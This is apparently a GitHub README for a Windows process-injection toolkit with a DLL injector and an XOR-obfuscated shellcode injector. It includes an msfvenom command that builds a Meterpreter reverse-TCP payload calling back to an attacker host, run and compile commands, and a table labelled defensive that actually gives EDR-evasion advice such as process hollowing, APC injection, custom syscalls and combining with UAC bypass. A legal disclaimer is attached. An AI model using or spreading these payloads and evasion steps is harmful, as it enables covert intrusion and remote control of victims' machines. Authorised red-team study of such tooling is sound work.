# Dll-Inject 🔧 | Windows Injection Toolkit

Tools for implementing Windows processes, including implementing DLL libraries and implementing XOR-encrypted shellcode. Includes architecture verification and error handling

![GitHub](https://img.shields.io/badge/Language-C++-blue) 
![License](https://img.shields.io/badge/License-MIT-green) 
![Platform](https://img.shields.io/badge/OS-Windows-lightgrey)

<h2 align="center">⚠️ Legal & Ethical Warning</h2> 
<strong>This project is for educational and authorized security research only.</strong> Unauthorized use, including but not limited to attacking systems without explicit owner consent, is strictly prohibited and violates international cybercrime laws 

**By using this toolkit, you agree to:**
1. **Legal Compliance**: Use only on systems you own or have written authorization to test
2. **Ethical Responsibility**: Never engage in malicious activities or data destruction
3. **Full Liability**: Assume all legal/financial consequences for misuse


## 🛠️ Core Features

| **Feature**              | **DLL Injector**                        | **Shellcode Injector**                        |
|--------------------------|-----------------------------------------|-----------------------------------------------|
| **Injection Method**     | `CreateRemoteThread` + `LoadLibraryW`   | Direct memory execution + XOR decryption      |
| **Payload Delivery**     | On-disk DLL                             | Fully in-memory                               |
| **Memory Protection**    | `PAGE_READWRITE`                        | `PAGE_EXECUTE_READWRITE` (DEP bypass)         |
| **Architecture Control** | Manual matching required                | Auto-detection via `IsWow64Process`           |
| **Obfuscation**          | None                                    | XOR encryption (key: `0xAA`)                  |
| **Payload Types**        | Standard DLLs                           | Staged/Non-staged (CS/Meterpreter compatible) |
| **Error Reporting**      | Win32 error codes                       | Detailed codes + execution timeout            |
| **Cleanup**              | Full handle/memory release              | Post-execution sanitization                   |
| **Ideal For**            | Game modding, debug hooks               | Red team operations, EDR research             |

## 🎯 Usage Scenarios

### DLL Injection
**Test DLL Creation:**
```cpp
// test_dll.cpp
#include <windows.h>
extern "C" __declspec(dllexport) void EntryPoint() {
    MessageBoxA(0, "Injected!", "Success", MB_OK);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
    if (ul_reason == DLL_PROCESS_ATTACH) EntryPoint();
    return TRUE;
}
```
**Execution:**
```bash
.\dll-injector.exe (Get-Process notepad).Id "C:\test-payload.dll"
```

### Shellcode Injection
**Payload Generation:**
```bash
msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=666 -f type
```
**Code Integration:**
```cpp
// shellcode-injector.cpp
unsigned char shellcode[] = { 
    ...
};
```
**Execution:**
```bash
shellcode-injector.exe 1472
```
<h1 align="center">
    <a href="https://github.com/Untouchable17/Windows-DLL-Shellcode-Injection-Toolkit">
        <img src="https://i.ibb.co/KkKZVkS/photo-shellcode.jpg" width="700">
    </a>
</h1>


## 🛠️ Compilation Guide

### **DLL Injector**
```bash
# x64
x86_64-w64-mingw32-g++ dll-injector.cpp -o dll-injector.exe -static -lws2_32 -s -Os

# x86
i686-w64-mingw32-g++ dll-injector.cpp -o dll-injector32.exe -static -lws2_32 -s -Os

# Flags: -s (strip symbols), -Os (optimize for size) - optionally
```

### **Shellcode Injector**
```bash
# x64
x86_64-w64-mingw32-g++ shellcode-injector.cpp -o shellcode-injector.exe -static -lwin32 -s -Os

# x86
i686-w64-mingw32-g++ shellcode-injector.cpp -o shellcode-injector32.exe -static -lwin32 -s -Os

# Flags: -s (strip symbols), -Os (optimize for size) - optionally
```

## 🛡️ Defensive Considerations
| **Technique**             | **Detection Risk**         | **Mitigation Tips**                                                |
|---------------------------|----------------------------|--------------------------------------------------------------------|
| **Classic DLL Injection** | High                       | Use reflective DLL loading                                         |
| **XOR Encryption**        | Medium                     | Implement AES + runtime key derivation                             |
| **RWX Memory**            | Critical                   | Use NTAPI calls `NtAllocateVirtualMemory` + memory section mapping |
| **Remote Threads**        | High                       | Leverage process hollowing or APC queue injection                  |


### ⚠️ Important Notes
- **EDR Bypass:** This toolkit does not implement advanced evasion techniques. Always:
    - Test in isolated environments 
    - Combine with process spoofing/UAC bypass
    - Use custom syscalls instead of WinAPI
- **Shellcode Requirements:**
    - Position-independent (PIC)
    - Null-byte free (if using XOR)
- **Debugging:**
```cpp
#ifdef _DEBUG
printf("[+] Allocated memory at 0x%p\n", remoteBuffer);
#endif
```

<h2 align="center">Contact Developer</h2>

    Telegram Group:     t.me/secdet_team
    Email:              tylerblackout17@gmail.com
